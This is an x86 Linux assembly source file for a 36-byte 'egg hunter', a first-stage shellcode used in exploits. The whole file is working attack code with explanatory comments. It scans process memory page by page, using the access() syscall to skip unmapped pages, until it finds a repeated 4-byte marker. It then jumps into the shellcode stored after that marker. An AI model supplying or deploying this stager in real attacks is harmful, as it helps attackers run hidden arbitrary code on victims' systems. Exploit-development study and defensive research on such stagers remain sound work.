; Title: Linux/x86 Egg Hunter code - 36 bytes
; Author: Zsolt Agoston (agzsolt)

global _start

section .text

_start:
        xor edx, edx		;clear out edx

next4k:
        or dx, 0xfff     	;put 4095 in the counter, next inc will complete 4k

eggfind:
        inc edx         	;PAGE_SIZE=4096
        xor ecx, ecx
        mov ebx, edx    	;page address into ebx

        push 0x21       	;int access(const char *pathname, int mode)
        pop eax
        
	int 0x80

        cmp al,0xf2
        je next4k	    	;if page is non-accessible (eax=0xfffffff2 or -14), then try next page

        mov edi,edx		;prepare compare edi-eax
        mov eax,0xf89090f9 	;egg
        
	scasd           	;compare eax and edi, increases edi
        jne eggfind
        scasd           	;compare eax and [edi+4]
        jne eggfind

        jmp edi         	;execute shellcode
